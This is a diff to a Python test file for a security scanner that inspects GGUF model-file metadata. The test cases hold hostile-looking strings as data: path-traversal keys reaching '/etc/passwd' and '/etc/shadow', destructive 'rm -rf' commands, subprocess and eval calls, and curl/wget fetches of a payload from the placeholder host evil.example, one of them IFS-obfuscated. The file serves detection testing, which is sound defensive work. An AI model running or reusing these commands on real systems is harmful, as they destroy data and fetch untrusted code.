@@ -1074,7 +1074,7 @@ def test_gguf_unknown_tensor_type_uncached_rerun_preserves_exit2(
     )
 
 
-def test_gguf_scanner_suspicious_key_paths(tmp_path):
+def test_gguf_scanner_suspicious_key_paths(tmp_path: Path) -> None:
     """Test detection of suspicious key names with path traversal."""
     path = tmp_path / "suspicious.gguf"
     _write_minimal_gguf(path, kv_key=b"../../../etc/passwd", kv_value=b"root")
@@ -1083,7 +1083,7 @@ def test_gguf_scanner_suspicious_key_paths(tmp_path):
     assert any("path traversal" in i.message.lower() for i in result.issues)
 
 
-def test_gguf_scanner_suspicious_values(tmp_path):
+def test_gguf_scanner_suspicious_values(tmp_path: Path) -> None:
     """Test detection of suspicious metadata values."""
     path = tmp_path / "suspicious.gguf"
     _write_minimal_gguf(path, kv_key=b"command", kv_value=b"rm -rf /")
@@ -1141,6 +1141,7 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("command", "sudo rm -rf /tmp/model-cache", "command_execution"),
         ("command", "sudo rm /tmp/model-cache -r -f", "command_execution"),
         ("command", "timeout 5 rm -rf /tmp/model-cache", "command_execution"),
+        ("loader", "eval('1 + 1')", "command_execution"),
         ("loader", "subprocess.run(['id'])", "command_execution"),
         ("payload_path", "../tmp/../../payload.bin", "path_traversal"),
         ("encoded_payload", "%2E%2e/%2e%2e/etc/shadow", "path_traversal"),
@@ -1155,6 +1156,7 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("download", "curl --request POST https://evil.example/payload.sh", "remote_fetch"),
         ("download", 'url=https://evil.example/payload.sh; curl "$url"', "remote_fetch"),
         ("download", "payload_url='https://evil.example/payload.sh'; wget ${payload_url}", "remote_fetch"),
+        ("download", "curl${IFS}https://evil.example/payload.sh", "remote_fetch"),
         ("download", "```bash\ncurl https://evil.example/payload.sh\n```", "remote_fetch"),
         ("download", "/usr/bin/curl https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl -H 'Authorization: Bearer token' https://evil.example/payload.sh", "remote_fetch"),
@@ -1223,6 +1225,13 @@ def test_gguf_metadata_remote_fetch_near_matches_stay_clean(value: str) -> None:
 )
 def test_gguf_metadata_curl_option_values_without_destination_stay_clean(value: str) -> None:
     evidence = GgufScanner._metadata_value_security_evidence("download", value)
+
+    assert evidence == []
+
+
+@pytest.mark.parametrize("value", ["model.eval()", "module.exec('noop')", "loader.__import__('safe_name')"])
+def test_gguf_metadata_python_attribute_methods_stay_clean(value: str) -> None:
+    evidence = GgufScanner._metadata_value_security_evidence("loader", value)
 
     assert evidence == []
 
